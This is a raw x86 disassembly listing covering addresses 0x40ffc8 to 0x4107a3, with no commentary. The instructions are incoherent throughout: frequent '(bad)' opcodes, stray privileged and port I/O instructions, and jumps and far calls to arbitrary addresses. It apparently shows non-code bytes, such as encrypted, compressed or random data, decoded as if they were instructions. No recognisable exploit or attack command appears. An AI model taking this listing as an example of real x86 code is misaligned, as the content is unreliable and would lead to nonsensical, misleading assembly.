  40ffc8:	out    dx,eax
  40ffc9:	addr16 hlt 
  40ffcb:	xchg   edx,eax
  40ffcc:	adc    BYTE PTR [ecx-0x20],bh
  40ffcf:	mov    esi,0x4cc2f746
  40ffd4:	push   edx
  40ffd5:	or     DWORD PTR [eax+0x38],ecx
  40ffd8:	xchg   ecx,eax
  40ffd9:	ja     0x410052
  40ffdb:	inc    edi
  40ffdc:	rcl    DWORD PTR [esi],0xc8
  40ffdf:	mov    eax,ds:0xd5e2ab20
  40ffe4:	ret    
  40ffe5:	pop    ebx
  40ffe6:	rcl    esi,1
  40ffe8:	xor    ebx,DWORD PTR [ebx]
  40ffea:	pop    esi
  40ffeb:	call   0xb1e42a12
  40fff0:	push   0x72
  40fff2:	scas   al,BYTE PTR es:[edi]
  40fff3:	aaa    
  40fff4:	xor    BYTE PTR [edx+0x47],dl
  40fff7:	sub    edi,DWORD PTR [edi+esi*8-0x5cbf9222]
  40fffe:	fwait
  40ffff:	(bad)  
  410000:	(bad)  
  410001:	pop    ebp
  410002:	xor    DWORD PTR [edx-0x1],0x76cb4f34
  410009:	adc    BYTE PTR [ecx+0x3fbfa293],al
  41000f:	mov    ebp,0x43a1997e
  410014:	daa    
  410015:	mov    al,ds:0xee11da20
  41001a:	mov    ds:0xec6c4837,eax
  41001f:	imul   bl
  410021:	imul   edx,DWORD PTR [ecx-0x72fe15ad],0x46
  410028:	sti    
  410029:	dec    ebp
  41002a:	fisubr WORD PTR [ecx]
  41002c:	fidivr WORD PTR [eax-0x78]
  41002f:	sbb    DWORD PTR [ebp-0x56],ebx
  410032:	in     eax,dx
  410033:	mov    ds:0x5c542de4,eax
  410038:	dec    eax
  410039:	cmp    ch,0x43
  41003c:	jbe    0x410048
  41003e:	das    
  41003f:	bnd jb 0x40ffc7
  410042:	retf   
  410043:	iret   
  410044:	cdq    
  410045:	and    BYTE PTR [edi+esi*4+0x59],0x4
  41004a:	mov    ecx,0x7d47fbc0
  41004f:	jmp    0x514264d0
  410054:	shr    dl,cl
  410056:	in     eax,0x1e
  410058:	aas    
  410059:	adc    dl,dl
  41005b:	arpl   WORD PTR [ebx],sp
  41005d:	pop    edi
  41005e:	fcomp  QWORD PTR ds:0xd52d6786
  410064:	xor    eax,0xe215bbe8
  410069:	xor    al,0x9e
  41006b:	xor    ecx,DWORD PTR [esi+eax*1]
  41006e:	loop   0x4100c9
  410070:	into   
  410071:	adc    eax,0xd598af1e
  410076:	nop
  410077:	xchg   edi,eax
  410078:	les    ebx,FWORD PTR [ebp-0x39]
  41007b:	stos   BYTE PTR es:[edi],al
  41007c:	add    ch,al
  41007e:	dec    eax
  41007f:	inc    eax
  410080:	daa    
  410081:	mov    WORD PTR [ebp+eax*1+0x66969fdb],ss
  410088:	add    al,bl
  41008a:	xchg   DWORD PTR [edi+0x2538a488],ebp
  410090:	jge    0x410098
  410092:	jg     0x41004f
  410094:	sbb    eax,0xca14708e
  410099:	les    edx,FWORD PTR [ebp+0x7f755392]
  41009f:	scas   eax,DWORD PTR es:[edi]
  4100a0:	dec    edi
  4100a1:	(bad)  
  4100a2:	cmp    DWORD PTR [esi-0x5bdd478e],eax
  4100a8:	xchg   ebx,eax
  4100a9:	sbb    al,0x7e
  4100ab:	add    ecx,esp
  4100ad:	fstp   st(7)
  4100af:	out    0x1c,eax
  4100b1:	cmp    DWORD PTR [eax-0x300fc57],esi
  4100b7:	shl    BYTE PTR [ebp-0xccaa222],cl
  4100bd:	cs and al,0xf5
  4100c0:	js     0x41012c
  4100c2:	clc    
  4100c3:	cwde   
  4100c4:	cmp    al,0x32
  4100c6:	pop    ebp
  4100c7:	pop    ebx
  4100c8:	sub    eax,0xa2c0b780
  4100cd:	(bad)  
  4100ce:	mov    esi,0xcea8c1a0
  4100d3:	ds lock stc 
  4100d6:	mov    ah,0x4
  4100d8:	sub    al,0x42
  4100da:	push   ebp
  4100db:	loop   0x410121
  4100dd:	sbb    al,0x60
  4100df:	out    0xfc,eax
  4100e1:	xor    al,0xd6
  4100e3:	or     eax,0x4d653f5a
  4100e8:	mov    DWORD PTR [ebp+0x27],ebp
  4100eb:	mov    al,ds:0xc198dc14
  4100f0:	div    BYTE PTR [ecx]
  4100f2:	jmp    0x4100ba
  4100f4:	jl     0x410112
  4100f6:	xchg   BYTE PTR [edx],al
  4100f8:	ins    BYTE PTR es:[edi],dx
  4100f9:	add    ch,ah
  4100fb:	std    
  4100fc:	inc    esp
  4100fd:	add    esi,DWORD PTR ds:0xedeb41ef
  410103:	in     eax,dx
  410104:	cmp    DWORD PTR [ecx+0x4f5133b7],0x39
  41010b:	mov    ebx,0xbd4c5acf
  410110:	sub    DWORD PTR [edx-0x25],esp
  410113:	push   edi
  410114:	push   edx
  410115:	int    0x29
  410117:	adc    al,ch
  410119:	and    ah,BYTE PTR [ecx]
  41011b:	imul   edi,DWORD PTR [ecx],0x2a17045
  410121:	or     bl,bl
  410123:	dec    edx
  410124:	xor    eax,0x46cfa8a2
  410129:	dec    eax
  41012a:	push   0x8fed6dc4
  41012f:	sbb    DWORD PTR [edi+0x3a236178],eax
  410135:	xchg   DWORD PTR [ebx+0x6b],eax
  410138:	daa    
  410139:	test   BYTE PTR [edi-0x5643c74e],ch
  41013f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410140:	xchg   esi,eax
  410141:	pop    esi
  410142:	ja     0x410154
  410144:	hlt    
  410145:	sti    
  410146:	push   esp
  410147:	pop    esp
  410148:	and    BYTE PTR [esp+esi*2+0x4c1c4187],dh
  41014f:	rcl    ah,1
  410151:	(bad)  
  410152:	adc    ebx,DWORD PTR [ecx+0x76]
  410155:	jl     0x4101a6
  410157:	call   edi
  410159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41015a:	mov    WORD PTR [edx+eiz*2],ds
  41015d:	jns    0x4101c9
  41015f:	out    dx,eax
  410160:	lods   al,BYTE PTR ds:[esi]
  410161:	dec    ecx
  410162:	sar    BYTE PTR [eax],1
  410164:	xor    eax,0x3ac025ed
  410169:	imul   esp,edx,0xffffffa2
  41016c:	adc    bh,dh
  41016e:	fucomip st,st(7)
  410170:	icebp  
  410171:	cmp    DWORD PTR [edi+esi*1+0x28],0x83c8732a
  410179:	stc    
  41017a:	(bad)  
  41017b:	fadd   QWORD PTR [eax-0x534232f3]
  410181:	mov    ebp,0x788d67c
  410186:	fcomp  QWORD PTR [eax-0x7b7a9179]
  41018c:	iret   
  41018d:	out    dx,eax
  41018e:	dec    edx
  41018f:	(bad)  
  410190:	popf   
  410191:	pop    esp
  410192:	xor    ebp,eax
  410194:	loope  0x410161
  410196:	into   
  410197:	rol    ebp,cl
  410199:	dec    ebx
  41019a:	stos   BYTE PTR es:[edi],al
  41019b:	sbb    al,BYTE PTR [ecx]
  41019d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41019e:	leave  
  41019f:	or     DWORD PTR [ebp-0x7],0x842c99c0
  4101a6:	les    edx,FWORD PTR [eax]
  4101a8:	dec    edi
  4101a9:	dec    ecx
  4101aa:	repz (bad) 
  4101ac:	xchg   DWORD PTR [esi+0xf],eax
  4101af:	ror    BYTE PTR [ecx+ebp*1],cl
  4101b2:	push   es
  4101b3:	mov    BYTE PTR [ebx],al
  4101b5:	push   0x1f5bc5bd
  4101ba:	sbb    DWORD PTR [ebp+0x26fbae79],edi
  4101c0:	aas    
  4101c1:	je     0x41017a
  4101c3:	and    edx,esp
  4101c5:	add    DWORD PTR [eax+0x72362360],edx
  4101cb:	xor    BYTE PTR [eax-0x128efe38],al
  4101d1:	hlt    
  4101d2:	jbe    0x4101c2
  4101d4:	retf   
  4101d5:	jle    0x410160
  4101d7:	adc    ebp,edi
  4101d9:	xor    BYTE PTR [edx-0x13],dl
  4101dc:	int    0xf6
  4101de:	sbb    dh,BYTE PTR [eax+0x66a66f4b]
  4101e4:	xor    BYTE PTR [ebx-0x3],dh
  4101e7:	push   edx
  4101e8:	cmp    eax,DWORD PTR [ebx-0x80]
  4101eb:	fistp  WORD PTR [esi+0x8c1bbae]
  4101f1:	int    0x5e
  4101f3:	icebp  
  4101f4:	nop
  4101f5:	sub    bh,al
  4101f7:	or     al,0x93
  4101f9:	xor    eax,0x5058a7a5
  4101fe:	call   0xe98b3d18
  410203:	cdq    
  410204:	mov    al,ds:0xe3711ba1
  410209:	add    edx,esi
  41020b:	sahf   
  41020c:	(bad)  
  41020d:	mov    al,0x52
  41020f:	stc    
  410210:	icebp  
  410211:	not    BYTE PTR [edi-0x2a]
  410214:	mov    ecx,0x3ee6dd27
  410219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41021a:	dec    eax
  41021b:	cwde   
  41021c:	pop    ecx
  41021d:	mov    cl,al
  41021f:	dec    edx
  410220:	or     ecx,ecx
  410222:	mov    DWORD PTR [esi-0x9],0x3eaff706
  410229:	mov    eax,0x3cf82622
  41022e:	(bad)  
  41022f:	jns    0x4102af
  410231:	int    0x70
  410233:	out    dx,eax
  410234:	and    BYTE PTR [edx-0x80],0x1a
  410238:	dec    edx
  410239:	sahf   
  41023a:	leave  
  41023b:	ret    
  41023c:	mov    edx,0x7e180e8a
  410242:	mov    cl,0x19
  410244:	add    dl,bh
  410246:	jns    0x4102a7
  410248:	xchg   edi,eax
  410249:	adc    edx,DWORD PTR [edx]
  41024b:	pop    esi
  41024c:	add    BYTE PTR ds:[edi-0x355ab284],ah
  410253:	(bad)  
  410254:	push   ds
  410255:	xor    dl,cl
  410257:	stos   DWORD PTR es:[edi],eax
  410258:	arpl   WORD PTR [edx],bp
  41025a:	xor    cl,BYTE PTR [edi+edi*4]
  41025d:	loop   0x41023d
  41025f:	add    eax,0x303140ef
  410264:	aaa    
  410265:	es and esi,edx
  410268:	retf   
  410269:	ja     0x410245
  41026b:	gs pop ds
  41026d:	mov    ebx,edx
  41026f:	sbb    edx,eax
  410271:	ss nop
  410273:	and    eax,0x65e55029
  410278:	xchg   ecx,eax
  410279:	xor    al,0xcd
  41027b:	mov    ?,WORD PTR [esi+ebx*4]
  41027e:	jl     0x4102a5
  410280:	int3   
  410281:	dec    esp
  410282:	shr    ch,1
  410284:	add    DWORD PTR [edi-0x2c],esp
  410287:	imul   esi,DWORD PTR [edx],0xffffff96
  41028a:	push   0x96535c9c
  41028f:	aad    0xb3
  410291:	xchg   ebx,eax
  410292:	add    cl,cl
  410294:	loopne 0x4102b7
  410296:	mov    cl,0x45
  410298:	fsubrp st(6),st
  41029a:	push   ecx
  41029b:	test   DWORD PTR [edx+0x9],esp
  41029e:	(bad)  
  41029f:	pop    esp
  4102a0:	nop
  4102a1:	jns    0x41025a
  4102a3:	dec    edi
  4102a4:	xor    edx,edi
  4102a6:	and    eax,0x2f424389
  4102ab:	hlt    
  4102ac:	xor    bl,BYTE PTR [eax+0x57680521]
  4102b2:	popa   
  4102b3:	stc    
  4102b4:	rol    ch,0x56
  4102b7:	shl    BYTE PTR [edx+esi*2],0xbf
  4102bb:	xchg   esp,eax
  4102bc:	pop    ss
  4102bd:	sbb    DWORD PTR [ebx+0x3ae1f60],ecx
  4102c3:	mov    esp,0x39be550d
  4102c8:	dec    eax
  4102c9:	wrmsr  
  4102cb:	sbb    eax,DWORD PTR [ebx+ecx*1+0x6399977a]
  4102d2:	ins    BYTE PTR es:[edi],dx
  4102d3:	xlat   BYTE PTR ds:[ebx]
  4102d4:	cmp    ecx,edx
  4102d6:	test   al,0xc5
  4102d8:	add    BYTE PTR [eax-0x32d935e5],0x55
  4102df:	call   0x34d048bc
  4102e4:	xor    BYTE PTR [edi-0x25],al
  4102e7:	sar    BYTE PTR [ebx],0x8f
  4102ea:	push   cs
  4102eb:	into   
  4102ec:	push   es
  4102ed:	cmp    eax,0x2041ea9e
  4102f2:	repz neg DWORD PTR [ebx+0x67d2d197]
  4102f9:	or     bh,BYTE PTR [esi-0x12611eea]
  4102ff:	fincstp 
  410301:	xchg   esp,eax
  410302:	add    bh,BYTE PTR [edx]
  410304:	xor    DWORD PTR [edi+0x51cf1d38],esi
  41030a:	loope  0x4102d3
  41030c:	dec    eax
  41030d:	(bad)  
  41030e:	jl     0x410294
  410310:	ret    
  410311:	fsubr  QWORD PTR [eax]
  410313:	cmp    BYTE PTR [edx+0x2bfd8e07],al
  410319:	inc    ebp
  41031a:	mov    al,ds:0xa56188da
  41031f:	int    0xed
  410321:	sub    bl,BYTE PTR [edx]
  410323:	jb     0x4103a4
  410325:	ret    
  410326:	clc    
  410327:	fcom   st(1)
  410329:	push   eax
  41032a:	daa    
  41032b:	push   0x24e523b8
  410330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410331:	fmul   QWORD PTR [esi+esi*1-0x405a9826]
  410338:	bound  ecx,QWORD PTR [ecx]
  41033a:	loopne 0x410356
  41033c:	test   BYTE PTR [edi-0x7e],dl
  41033f:	cmp    dl,BYTE PTR ds:[edx]
  410342:	daa    
  410343:	inc    edi
  410344:	lods   al,BYTE PTR ds:[esi]
  410345:	sbb    edx,DWORD PTR [edx+ebp*8]
  410348:	or     DWORD PTR [ecx+0x7de429b1],ebp
  41034e:	jg     0x4102fb
  410350:	scas   al,BYTE PTR es:[edi]
  410351:	jle    0x41036a
  410353:	test   BYTE PTR [edx],dl
  410355:	stc    
  410356:	xor    al,0x4c
  410358:	arpl   dx,dx
  41035a:	je     0x4103b4
  41035c:	mov    esp,0x55b6814e
  410361:	sub    BYTE PTR [ebp-0x45],0x43
  410365:	popf   
  410366:	into   
  410367:	out    0x20,eax
  410369:	dec    eax
  41036a:	dec    edi
  41036b:	(bad)  
  41036c:	dec    ecx
  41036d:	and    bh,cl
  41036f:	mov    dl,0xe3
  410371:	ret    0xf281
  410374:	cld    
  410375:	out    dx,al
  410376:	idiv   BYTE PTR [edi]
  410378:	mov    cs,WORD PTR [ebx-0x179bf2c7]
  41037e:	mov    esp,DWORD PTR [ecx]
  410380:	sub    eax,0xe3e3da24
  410385:	cmc    
  410386:	ret    0xe98d
  410389:	les    ebx,FWORD PTR [edx+eiz*1]
  41038c:	popa   
  41038d:	test   al,0xca
  41038f:	sahf   
  410390:	mov    edi,0xf402f387
  410395:	pop    ecx
  410396:	out    dx,al
  410397:	mov    eax,ds:0x96e755e6
  41039c:	out    dx,eax
  41039d:	cwde   
  41039e:	pop    ebp
  41039f:	sub    eax,0xb44f4d67
  4103a4:	xchg   edx,eax
  4103a5:	aad    0x49
  4103a7:	cmp    dh,BYTE PTR [ebp+edx*2+0x6b]
  4103ab:	mov    ?,WORD PTR ss:[ecx-0x4fc0bc7f]
  4103b2:	pop    eax
  4103b3:	(bad)  
  4103b4:	jp     0x41034b
  4103b6:	shl    DWORD PTR [edi+ebx*2],0x95
  4103ba:	data16 jnp 0x410412
  4103bd:	jnp    0x4103b0
  4103bf:	jae    0x4103bd
  4103c1:	push   ebp
  4103c2:	and    DWORD PTR [edx-0x41d46162],ebp
  4103c8:	inc    eax
  4103c9:	or     ecx,DWORD PTR [edi-0x16]
  4103cc:	pop    ss
  4103cd:	xchg   edx,eax
  4103ce:	push   ebp
  4103cf:	jmp    0x5815:0x3cdf006e
  4103d6:	add    eax,0xc490b917
  4103db:	jge    0x410408
  4103dd:	jae    0x410459
  4103df:	ror    BYTE PTR cs:[esi+0x6cfce557],0xc4
  4103e7:	call   0xcf37:0xb44461e7
  4103ee:	std    
  4103ef:	or     ecx,0x122d88e3
  4103f5:	xchg   DWORD PTR [eax-0x62ada811],esi
  4103fb:	in     al,0xda
  4103fd:	aaa    
  4103fe:	xchg   DWORD PTR [ebp-0x12],ecx
  410401:	(bad)  
  410402:	cmp    eax,0xa8865e5c
  410407:	xchg   edx,eax
  410408:	ja     0x4103bb
  41040a:	cmc    
  41040b:	mov    eax,0x325d6351
  410410:	sar    DWORD PTR [edi+ebx*4],1
  410413:	nop
  410414:	dec    ebx
  410415:	fcom   st(7)
  410417:	in     al,0xc2
  410419:	mov    dl,dh
  41041b:	test   eax,0xf757aa12
  410420:	loop   0x41041a
  410422:	xor    esp,edi
  410424:	pop    esi
  410425:	cmp    DWORD PTR [edi],0xffffffdf
  410428:	mov    dl,0x1c
  41042a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41042b:	add    cl,BYTE PTR [edx]
  41042d:	fild   WORD PTR [edx]
  41042f:	pop    esp
  410430:	(bad)  
  410431:	out    0xb,eax
  410433:	xchg   ebp,eax
  410434:	inc    ecx
  410435:	or     DWORD PTR [ecx+eax*1],esp
  410438:	inc    edi
  410439:	aam    0xc1
  41043b:	iret   
  41043c:	mov    ch,0x62
  41043e:	imul   ebx,edx,0xffffffe1
  410441:	and    dh,BYTE PTR [ecx+0x22]
  410444:	jle    0x4104b6
  410446:	xor    edx,edx
  410448:	lods   al,BYTE PTR ds:[esi]
  410449:	sahf   
  41044a:	lods   al,BYTE PTR ds:[esi]
  41044b:	call   DWORD PTR [edi-0x54]
  41044e:	mov    bh,0x9e
  410450:	xchg   esp,eax
  410451:	aad    0xd6
  410453:	lods   al,BYTE PTR ds:[esi]
  410454:	xchg   esi,eax
  410455:	mov    esi,0x57ed9843
  41045a:	retf   0x69b9
  41045d:	ins    BYTE PTR es:[edi],dx
  41045e:	pop    ss
  41045f:	lods   eax,DWORD PTR ds:[esi]
  410460:	sahf   
  410461:	cmp    BYTE PTR [ebx+eax*4],dh
  410464:	adc    DWORD PTR [esi],esp
  410466:	out    0xc6,eax
  410468:	out    dx,eax
  410469:	xor    al,BYTE PTR [ebx]
  41046b:	pop    edi
  41046c:	scas   al,BYTE PTR es:[edi]
  41046d:	loop   0x4104a7
  41046f:	sub    eax,0x4e60ec5f
  410474:	mov    DWORD PTR [eax+0x27],esi
  410477:	out    dx,eax
  410478:	push   0x6903953e
  41047d:	es jno 0x4104c8
  410480:	mov    DWORD PTR [ebx+0x658b9f1b],edx
  410486:	cmp    DWORD PTR [esi+ebp*4+0x4fe9f11f],0x6a
  41048e:	bound  ecx,QWORD PTR [ecx]
  410490:	add    dl,dl
  410492:	lock in eax,dx
  410494:	push   cs
  410495:	jns    0x410494
  410497:	inc    esi
  410498:	shl    DWORD PTR [edi],1
  41049a:	pop    ds
  41049b:	shl    DWORD PTR [edx-0x15],cl
  41049e:	ss mov ch,0x27
  4104a1:	rol    DWORD PTR [edx-0x73],0xb7
  4104a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a6:	stc    
  4104a7:	cmp    al,0x81
  4104a9:	out    0x4d,al
  4104ab:	pop    es
  4104ac:	jo     0x410468
  4104ae:	push   esi
  4104af:	mov    esi,0xe6388baf
  4104b4:	mov    edi,0xf002ca9f
  4104b9:	mov    al,ds:0xee195e86
  4104be:	repz cs and eax,0x35ef206a
  4104c5:	xchg   edi,eax
  4104c6:	fld    TBYTE PTR [edi+ebx*2]
  4104c9:	clc    
  4104ca:	ins    BYTE PTR es:[edi],dx
  4104cb:	jl     0x4104ea
  4104cd:	leave  
  4104ce:	adc    ch,BYTE PTR [esi+0x4f7b058]
  4104d4:	pop    ds
  4104d5:	ins    DWORD PTR es:[edi],dx
  4104d6:	or     ah,bh
  4104d8:	out    0x9b,al
  4104da:	loop   0x410481
  4104dc:	es push 0x5f
  4104df:	cmp    BYTE PTR ds:0x7b0b73f0,al
  4104e5:	test   eax,0xcdcc5e79
  4104ea:	mov    al,ds:0xf66e253b
  4104ef:	or     eax,0x7d45d576
  4104f4:	sbb    BYTE PTR [edx+0x5d],cl
  4104f7:	pop    esp
  4104f8:	add    esi,ebx
  4104fa:	mov    esi,0x95716933
  4104ff:	aaa    
  410500:	adc    DWORD PTR [edx+0x73],ebp
  410503:	out    dx,eax
  410504:	in     al,0xcf
  410506:	sbb    al,0x4b
  410508:	jle    0x41053d
  41050a:	add    al,0xf1
  41050c:	jge    0x410521
  41050e:	xchg   esp,eax
  41050f:	pushf  
  410510:	in     eax,0xa4
  410512:	pusha  
  410513:	fcmove st,st(5)
  410515:	dec    esp
  410516:	jmp    0x4bc687c5
  41051b:	adc    eax,0x788bdf71
  410520:	fisubr WORD PTR [ebp-0x2450a360]
  410526:	into   
  410527:	sbb    eax,0xabd36f77
  41052c:	fdiv   st(6),st
  41052e:	in     al,0xfc
  410530:	add    ch,BYTE PTR [edx-0x24]
  410533:	xchg   ebx,eax
  410534:	retf   0x129c
  410537:	(bad)  
  410539:	sbb    DWORD PTR [ebx-0x71],0x2df0f939
  410540:	and    ebx,DWORD PTR [ebp-0x1]
  410543:	xlat   BYTE PTR ds:[ebx]
  410544:	or     DWORD PTR [esi],edx
  410546:	xchg   ebx,eax
  410547:	stos   DWORD PTR es:[edi],eax
  410548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410549:	lahf   
  41054a:	or     al,dh
  41054c:	lea    esi,[ebx]
  41054e:	mov    ds:0xf158628,al
  410553:	ret    0xe69c
  410556:	xor    al,0x11
  410558:	xchg   DWORD PTR [edi],esp
  41055a:	push   es
  41055b:	mov    bh,BYTE PTR [ebx+ecx*2]
  41055e:	cmc    
  41055f:	push   edi
  410560:	rcl    DWORD PTR [esi-0x5c326471],0x7b
  410567:	shl    DWORD PTR ds:0xedab9d3f,1
  41056d:	mov    bh,0x18
  41056f:	xor    al,0x30
  410571:	sar    BYTE PTR [ebx],cl
  410573:	mov    edi,0xa05bef69
  410578:	shl    BYTE PTR [edx+0x3a],1
  41057b:	dec    esp
  41057c:	rcl    BYTE PTR [eax],1
  41057e:	adc    al,0xe9
  410580:	call   0xfe90:0xbc671f5f
  410587:	lods   eax,DWORD PTR ds:[esi]
  410588:	xor    BYTE PTR [ecx+0x47],cl
  41058b:	dec    ecx
  41058c:	xchg   bh,al
  41058e:	sbb    al,0xde
  410590:	popa   
  410591:	ins    DWORD PTR es:[edi],dx
  410592:	mov    bl,0x92
  410594:	pop    ecx
  410595:	xchg   bl,dl
  410597:	xchg   ebp,eax
  410598:	scas   al,BYTE PTR es:[edi]
  410599:	sbb    al,0x59
  41059b:	xchg   esp,eax
  41059c:	lods   al,BYTE PTR ds:[esi]
  41059d:	cmp    ch,bh
  41059f:	out    0xa0,al
  4105a1:	jno    0x4105da
  4105a3:	lock repz clc 
  4105a6:	jmp    0x1887:0x30f89ea4
  4105ad:	int    0x74
  4105af:	(bad)  
  4105b0:	fild   QWORD PTR [esi+0x63]
  4105b3:	pop    ecx
  4105b4:	ror    DWORD PTR ds:0x79fe9e0a,1
  4105ba:	shr    bh,cl
  4105bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105bd:	pop    esi
  4105be:	xchg   esp,eax
  4105bf:	xchg   esi,eax
  4105c0:	in     eax,0xc2
  4105c2:	pushf  
  4105c3:	data16 fist DWORD PTR [ebx-0x2dab0042]
  4105ca:	cld    
  4105cb:	jmp    0x2c41706c
  4105d0:	xchg   edx,eax
  4105d1:	inc    esi
  4105d2:	pop    ds
  4105d3:	sbb    bh,BYTE PTR [edx+0x568dbf2c]
  4105d9:	daa    
  4105da:	(bad)  
  4105db:	aas    
  4105dc:	sub    esp,ebp
  4105de:	and    DWORD PTR [ecx],ebp
  4105e0:	mov    edx,0x6cc7965b
  4105e5:	jb     0x41056a
  4105e7:	in     eax,dx
  4105e8:	outs   dx,DWORD PTR ds:[esi]
  4105e9:	cs add ah,0xfe
  4105ed:	dec    ebp
  4105ee:	or     ch,BYTE PTR [esi]
  4105f0:	push   esp
  4105f1:	mov    al,0x5b
  4105f3:	push   edi
  4105f4:	xor    ebp,eax
  4105f6:	pop    ebp
  4105f7:	add    eax,0x248ee4d8
  4105fc:	jno    0x4105a0
  4105fe:	add    DWORD PTR [edx+edx*8-0x21],esp
  410602:	jno    0x410612
  410604:	imul   ebp,esp,0xffffff8d
  410607:	mov    bl,0x94
  410609:	cmp    al,0x37
  41060b:	out    dx,al
  41060c:	std    
  41060d:	imul   ebx,DWORD PTR [edx-0x67],0x932bb3f8
  410614:	push   esi
  410615:	or     eax,0xf1bb4684
  41061a:	inc    ebx
  41061b:	adc    eax,0x7d3089b6
  410620:	xchg   esi,esi
  410622:	ret    
  410623:	dec    edx
  410624:	je     0x41066c
  410626:	pop    ebp
  410627:	ins    DWORD PTR es:[edi],dx
  410628:	(bad)
  41062c:	xor    BYTE PTR [edi],cl
  41062e:	in     al,dx
  41062f:	fld    QWORD PTR [ebp-0x3ffada5d]
  410635:	test   eax,0x973bef5e
  41063a:	out    dx,eax
  41063b:	repnz (bad) 
  41063d:	dec    ebx
  41063e:	es adc eax,0x15dc88e3
  410644:	xor    dh,dh
  410646:	xchg   esi,eax
  410647:	in     eax,0x96
  410649:	pop    esp
  41064a:	sar    ebx,0x10
  41064d:	push   es
  41064e:	aam    0x51
  410650:	pushf  
  410651:	sbb    DWORD PTR ds:0xa3268645,0xffffffd8
  410658:	outs   dx,DWORD PTR ds:[esi]
  410659:	fwait
  41065a:	push   0x452a34c2
  41065f:	xchg   BYTE PTR [eax+0x2ca1ecde],dl
  410665:	xor    edx,edx
  410667:	in     al,0x2
  410669:	or     BYTE PTR [eax],dl
  41066b:	or     al,0x1f
  41066d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41066e:	mov    cl,0xea
  410670:	pop    eax
  410671:	(bad)  
  410672:	ret    0x476f
  410675:	xor    eax,0x5785ab86
  41067a:	aad    0x80
  41067c:	cli    
  41067d:	inc    ebp
  41067e:	dec    esi
  41067f:	sub    bh,cl
  410681:	aam    0xeb
  410683:	mov    BYTE PTR [ebx+eax*8-0x1],ch
  410687:	leave  
  410688:	shr    edi,1
  41068a:	aaa    
  41068b:	fisttp QWORD PTR [ebx-0x1c821f0]
  410691:	push   esi
  410692:	lahf   
  410693:	arpl   WORD PTR [edx-0x5],sp
  410696:	shl    DWORD PTR [edx-0x1e],cl
  410699:	mov    eax,ds:0xdb348e31
  41069e:	inc    DWORD PTR [edx]
  4106a0:	rcr    BYTE PTR [ebp-0x20631123],cl
  4106a6:	pop    edi
  4106a7:	jns    0x410646
  4106a9:	in     eax,dx
  4106aa:	cdq    
  4106ab:	push   ds
  4106ac:	cmc    
  4106ad:	mov    eax,ds:0x396fae13
  4106b2:	xlat   BYTE PTR ds:[ebx]
  4106b3:	cmp    BYTE PTR [edi+0x22],ah
  4106b6:	imul   ebp,DWORD PTR [ebp+0x67],0xa3ef9f8f
  4106bd:	jp     0x4106be
  4106bf:	(bad)  
  4106c0:	push   0xffffffc5
  4106c2:	les    edx,FWORD PTR ds:[eax-0x75]
  4106c6:	push   edi
  4106c7:	(bad)  [edi-0x5452b86]
  4106cd:	imul   DWORD PTR [ebp+edx*1-0x78]
  4106d1:	adc    ebx,esi
  4106d3:	push   esi
  4106d4:	imul   ebp,DWORD PTR [edx-0x1d],0x68
  4106d8:	lahf   
  4106d9:	mov    dl,0x97
  4106db:	es xor bh,ch
  4106de:	in     al,0xa8
  4106e0:	cmc    
  4106e1:	in     al,0xa7
  4106e3:	cld    
  4106e4:	mov    DWORD PTR [ebp+ecx*4+0x7d],ebp
  4106e8:	push   ebx
  4106e9:	mov    ch,0xa9
  4106eb:	xor    eax,0xbab97deb
  4106f0:	mov    esp,0x42ce127d
  4106f5:	pushf  
  4106f6:	mov    esp,0x16711c2a
  4106fb:	fild   DWORD PTR [ecx-0x12]
  4106fe:	nop
  4106ff:	je     0x4106d2
  410701:	adc    al,0xc3
  410703:	aaa    
  410704:	mov    dh,dh
  410706:	stc    
  410707:	dec    esi
  410708:	add    ah,BYTE PTR [ecx-0x5e48fc21]
  41070e:	pop    es
  41070f:	lods   eax,DWORD PTR ds:[esi]
  410710:	sbb    BYTE PTR [edx],ah
  410712:	es push cs
  410714:	lds    edx,FWORD PTR [edi]
  410716:	jo     0x4106ff
  410718:	mov    dh,0x2
  41071a:	dec    ecx
  41071b:	mov    eax,ds:0x6ed9795c
  410720:	mov    edx,0xa9c4f81c
  410725:	push   ebp
  410726:	xor    dl,BYTE PTR [ebx+0x14]
  410729:	(bad)  
  41072a:	cli    
  41072b:	push   esp
  41072c:	sbb    al,0xcf
  41072e:	jno    0x410788
  410730:	shr    BYTE PTR [esp+eax*4-0x427bb7ae],1
  410737:	imul   edi,DWORD PTR [ebx+0x3f6e84f5],0xffffff91
  41073e:	stos   BYTE PTR es:[edi],al
  41073f:	int3   
  410740:	ffreep st(3)
  410742:	les    ebp,FWORD PTR [esi]
  410744:	fwait
  410745:	push   eax
  410746:	(bad)  
  410747:	dec    ebx
  410748:	pop    edx
  410749:	fstp   QWORD PTR [esi+0x51efb8c3]
  41074f:	aam    0x92
  410751:	push   ecx
  410752:	and    DWORD PTR [edx+0x56],esi
  410755:	add    ah,BYTE PTR [ebp-0x54]
  410758:	jg     0x4106e9
  41075a:	cmp    ch,BYTE PTR [ebx+eax*2]
  41075d:	cmp    al,0xbe
  41075f:	arpl   WORD PTR [edi],bp
  410761:	mov    eax,ds:0xba375081
  410766:	jl     0x4106f4
  410768:	add    DWORD PTR [ebp-0x1c],eax
  41076b:	xlat   BYTE PTR ds:[ebx]
  41076c:	jmp    0x24a8:0xd03c075c
  410773:	daa    
  410774:	js     0x410701
  410776:	pop    eax
  410777:	xor    BYTE PTR [edx-0x3f],bl
  41077a:	jge    0x4107b4
  41077c:	mov    eax,ds:0xc5b1fc26
  410781:	pop    eax
  410782:	sbb    esi,ecx
  410784:	mov    eax,ds:0x6a246d1
  410789:	add    bl,BYTE PTR [ecx]
  41078b:	out    0x8f,al
  41078d:	in     eax,dx
  41078e:	push   cs
  41078f:	adc    esp,eax
  410791:	sub    DWORD PTR [ecx+0x383dbb4c],eax
  410797:	pop    edx
  410798:	add    al,BYTE PTR [edx-0x4854885b]
  41079e:	xor    ah,BYTE PTR [edi+ebp*2-0x6]
  4107a2:	sti    
  4107a3:	cld    
